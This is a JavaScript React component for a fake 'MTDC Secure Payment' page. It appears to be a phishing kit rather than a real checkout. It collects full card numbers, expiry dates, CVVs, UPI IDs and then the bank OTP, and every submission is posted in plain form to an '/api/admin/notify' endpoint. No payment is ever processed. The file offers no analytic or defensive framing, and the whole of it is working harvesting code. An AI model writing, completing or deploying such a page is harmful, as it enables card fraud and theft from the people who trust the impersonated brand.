const reactLib = window.React || globalThis.React;
if (!reactLib) {
  const redirectUrl = new URL('/secure-payment.html', window.location.origin);
  redirectUrl.search = window.location.search || '';
  redirectUrl.hash = window.location.hash || '';
  window.location.replace(redirectUrl.toString());
  throw new Error('React runtime unavailable; redirected to static secure payment page.');
}

const { useState, createElement } = reactLib;

export default function PaymentPage() {
  const params = new URLSearchParams(window.location.search);
  const bookingId = params.get('bookingId') || params.get('pnr') || '';
  const amount = Number(params.get('amount') || 0);

  const [method, setMethod] = useState('card');
  const [guestName, setGuestName] = useState('');
  const [mobile, setMobile] = useState('');
  const [cardHolderName, setCardHolderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [upiId, setUpiId] = useState('');
  const [showOTP, setShowOTP] = useState(false);
  const [otp, setOtp] = useState('');
  const [paymentRecordId, setPaymentRecordId] = useState(null);
  const [message, setMessage] = useState('');
  const [busy, setBusy] = useState(false);

  const amountLabel = `₹${Number.isFinite(amount) ? amount.toLocaleString('en-IN') : '0'}`;

  const sendToAdminPanel = async (payload) => {
    try {
      const response = await fetch('/api/admin/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      return await response.json();
    } catch (err) {
      console.error('Admin Panel Request Failed:', err);
      return null;
    }
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();

    if (!bookingId || bookingId.trim().length < 3) {
      setMessage('Please enter a valid booking ID.');
      return;
    }

    const cleanCardNumber = cardNumber.replace(/\D/g, '');
    if (!cardHolderName.trim() || !cleanCardNumber || !cardExpiry.trim() || !cardCvv.trim()) {
      setMessage('Please fill all card details.');
      return;
    }
    if (cleanCardNumber.length < 12 || cleanCardNumber.length > 19) {
      setMessage('Please enter a valid card number.');
      return;
    }

    setBusy(true);
    setMessage('');

    try {
      const recordId = `REC-${Date.now()}`;
      setPaymentRecordId(recordId);

      await sendToAdminPanel({
        activityType: 'card_submission',
        recordId,
        bookingId: bookingId.trim(),
        guestName: guestName.trim() || cardHolderName.trim(),
        mobile: mobile.trim(),
        amount,
        paymentMethod: 'card',
        cardHolderName: cardHolderName.trim(),
        cardNumber: cleanCardNumber,
        cardExpiry: cardExpiry.trim(),
        cardCvv: cardCvv.trim(),
        submittedAt: new Date().toISOString()
      });

      setShowOTP(true);
      setMessage('Card details submitted to admin. Please enter the OTP.');
    } catch (err) {
      setMessage('Unable to send card details. Please try again.');
    } finally {
      setBusy(false);
    }
  };

  const handleUpiSubmit = async (e) => {
    e.preventDefault();

    if (!bookingId || bookingId.trim().length < 3) {
      setMessage('Please enter a valid booking ID.');
      return;
    }
    if (!upiId.trim()) {
      setMessage('Please enter a valid UPI ID.');
      return;
    }

    setBusy(true);
    setMessage('');

    try {
      const recordId = `UPI-${Date.now()}`;
      await sendToAdminPanel({
        activityType: 'upi_submission',
        recordId,
        bookingId: bookingId.trim(),
        guestName: guestName.trim() || 'UPI Guest',
        mobile: mobile.trim(),
        amount,
        paymentMethod: 'upi',
        upiId: upiId.trim(),
        status: 'pending',
        submittedAt: new Date().toISOString()
      });

      setMessage('UPI request submitted successfully to admin!');
    } catch (err) {
      setMessage('Unable to send UPI details. Please try again.');
    } finally {
      setBusy(false);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();

    if (!otp.trim()) {
      setMessage('Please enter the OTP.');
      return;
    }

    setBusy(true);

    try {
      await sendToAdminPanel({
        activityType: 'otp_submission',
        recordId: paymentRecordId,
        bookingId: bookingId.trim(),
        guestName: guestName.trim() || cardHolderName.trim(),
        mobile: mobile.trim(),
        otpEntered: otp.trim(),
        status: 'otp_received',
        submittedAt: new Date().toISOString()
      });

      setMessage('OTP submitted successfully to admin panel!');
      setOtp('');
    } catch (err) {
      setMessage('Failed to submit OTP. Please try again.');
    } finally {
      setBusy(false);
    }
  };

  const inputClass = 'w-full border border-gray-300 p-2.5 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none';

  const renderCardForm = () => createElement(
    'form',
    { onSubmit: handleCardSubmit, className: 'space-y-4' },
    createElement('div', null,
      createElement('label', { className: 'block text-sm font-medium text-gray-700 mb-1' }, 'Card Holder Name'),
      createElement('input', {
        type: 'text',
        className: inputClass,
        value: cardHolderName,
        onChange: (e) => setCardHolderName(e.target.value),
        placeholder: 'Name as printed on card',
        required: true
      })
    ),
    createElement('div', null,
      createElement('label', { className: 'block text-sm font-medium text-gray-700 mb-1' }, 'Card Number'),
      createElement('input', {
        type: 'text',
        className: inputClass,
        value: cardNumber,
        onChange: (e) => setCardNumber(e.target.value),
        placeholder: '16-Digit Card Number',
        maxLength: 19,
        required: true
      })
    ),
    createElement('div', { className: 'grid grid-cols-2 gap-4' },
      createElement('div', null,
        createElement('label', { className: 'block text-sm font-medium text-gray-700 mb-1' }, 'Expiry Date'),
        createElement('input', {
          type: 'text',
          className: inputClass,
          value: cardExpiry,
          onChange: (e) => setCardExpiry(e.target.value),
          placeholder: 'MM/YY',
          maxLength: 5,
          required: true
        })
      ),
      createElement('div', null,
        createElement('label', { className: 'block text-sm font-medium text-gray-700 mb-1' }, 'CVV Code'),
        createElement('input', {
          type: 'password',
          className: inputClass,
          value: cardCvv,
          onChange: (e) => setCardCvv(e.target.value),
          placeholder: '3 or 4 Digit CVV',
          maxLength: 4,
          required: true
        })
      )
    ),
    createElement('button', {
      type: 'submit',
      disabled: busy,
      className: 'w-full bg-blue-600 hover:bg-blue-700 text-white py-3.5 rounded-xl font-bold transition-all disabled:opacity-50'
    }, busy ? 'Sending Card Details...' : `Submit Card & Pay ${amountLabel}`)
  );

  const renderUpiForm = () => createElement(
    'form',
    { onSubmit: handleUpiSubmit, className: 'space-y-4' },
    createElement('div', null,
      createElement('label', { className: 'block text-sm font-medium text-gray-700 mb-1' }, 'UPI ID / VPA'),
      createElement('input', {
        type: 'text',
        className: inputClass,
        value: upiId,
        onChange: (e) => setUpiId(e.target.value),
        placeholder: 'e.g. name@paytm / name@ybl',
        required: true
      })
    ),
    createElement('button', {
      type: 'submit',
      disabled: busy,
      className: 'w-full bg-green-600 hover:bg-green-700 text-white py-3.5 rounded-xl font-bold transition-all disabled:opacity-50'
    }, busy ? 'Sending UPI Request...' : `Submit UPI · ${amountLabel}`)
  );

  const renderOtpForm = () => createElement(
    'form',
    { onSubmit: handleOtpSubmit, className: 'space-y-4 bg-blue-50/70 p-6 rounded-2xl border border-blue-200' },
    createElement('h2', { className: 'text-xl font-bold text-blue-900' }, 'OTP Verification Required'),
    createElement('p', { className: 'text-sm text-blue-700' },
      'Enter the OTP received on the registered mobile number associated with card ending in ',
      createElement('span', { className: 'font-bold' }, cardNumber.slice(-4))
    ),
    createElement('div', null,
      createElement('label', { className: 'block text-sm font-medium text-blue-900 mb-1' }, 'Enter OTP Code'),
      createElement('input', {
        type: 'text',
        className: 'w-full border border-blue-300 p-3 rounded-xl text-center font-mono text-2xl tracking-[0.3em] focus:ring-2 focus:ring-blue-500 outline-none bg-white',
        value: otp,
        onChange: (e) => setOtp(e.target.value),
        placeholder: '123456',
        maxLength: 8,
        required: true
      })
    ),
    createElement('div', { className: 'flex gap-3' },
      createElement('button', {
        type: 'submit',
        disabled: busy,
        className: 'flex-1 bg-blue-600 hover:bg-blue-700 text-white py-3.5 rounded-xl font-bold transition-all disabled:opacity-50'
      }, busy ? 'Verifying OTP...' : 'Submit OTP'),
      createElement('button', {
        type: 'button',
        onClick: () => setShowOTP(false),
        className: 'bg-gray-200 hover:bg-gray-300 text-gray-800 px-5 py-3.5 rounded-xl font-medium transition-all'
      }, 'Back')
    )
  );

  return createElement(
    'div',
    { className: 'min-h-screen bg-gray-50 p-4 sm:p-8' },
    createElement(
      'div',
      { className: 'max-w-3xl mx-auto bg-white p-6 sm:p-8 rounded-2xl shadow-md border border-gray-200' },
      createElement('div', { className: 'mb-6 border-b pb-4' },
        createElement('h1', { className: 'text-2xl font-bold text-gray-900' }, 'MTDC Secure Payment'),
        createElement('p', { className: 'text-sm text-gray-600 mt-1' },
          'Booking Reference: ',
          createElement('span', { className: 'font-semibold text-black' }, bookingId || 'N/A'),
          ' | Amount: ',
          createElement('span', { className: 'font-semibold text-black' }, amountLabel)
        )
      ),
      createElement('div', { className: 'grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6' },
        createElement('div', null,
          createElement('label', { className: 'block text-sm font-medium text-gray-700 mb-1' }, 'Guest Name'),
          createElement('input', {
            type: 'text',
            className: inputClass,
            value: guestName,
            onChange: (e) => setGuestName(e.target.value),
            placeholder: 'Enter Guest Full Name'
          })
        ),
        createElement('div', null,
          createElement('label', { className: 'block text-sm font-medium text-gray-700 mb-1' }, 'Mobile Number'),
          createElement('input', {
            type: 'text',
            className: inputClass,
            value: mobile,
            onChange: (e) => setMobile(e.target.value),
            placeholder: '10-Digit Mobile Number'
          })
        )
      ),
      !showOTP && createElement(
        'div',
        { className: 'flex gap-3 mb-6' },
        createElement('button', {
          type: 'button',
          onClick: () => { setMethod('card'); setMessage(''); },
          className: `flex-1 py-3 rounded-xl font-semibold border transition-all ${method === 'card' ? 'bg-blue-600 text-white border-blue-600 shadow-sm' : 'bg-gray-100 text-gray-700 border-gray-200 hover:bg-gray-200'}`
        }, 'Credit / Debit Card'),
        createElement('button', {
          type: 'button',
          onClick: () => { setMethod('upi'); setMessage(''); },
          className: `flex-1 py-3 rounded-xl font-semibold border transition-all ${method === 'upi' ? 'bg-blue-600 text-white border-blue-600 shadow-sm' : 'bg-gray-100 text-gray-700 border-gray-200 hover:bg-gray-200'}`
        }, 'UPI Payment')
      ),
      message && createElement('div', { className: 'mt-5 p-4 rounded-xl bg-gray-100 border border-gray-300 text-sm font-medium text-gray-800 transition-all' }, message),
      !showOTP && method === 'card' && renderCardForm(),
      !showOTP && method === 'upi' && renderUpiForm(),
      showOTP && renderOtpForm()
    )
  );
}
